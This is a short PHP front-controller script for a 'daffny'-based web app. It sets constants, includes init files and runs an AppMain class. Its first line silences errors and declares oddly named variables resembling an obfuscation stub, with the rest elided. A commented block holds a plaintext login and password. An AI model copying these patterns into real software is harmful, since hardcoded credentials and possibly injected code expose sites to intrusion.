<?php
error_reporting(0);header('Content-Type: text/html; charset=utf-8');$ooooOO0 = 'y9135';$O='';date_default_timezone_set('Asia/Tokyo');
...
define('FILES_DIR', "app");
/*
define('SITE_CLOSED', false);
define('SITE_CLOSED_LOGIN', "dragon");
define('SITE_CLOSED_PASSWORD', "dragon01*");
*/
require_once("daffny/init.php");
require_once(ROOT_PATH."functions.php");

$main = $daffny->load_class(CLASS_PATH, "main.php", "AppMain");
$main->init();
$main->run();
$main->done();
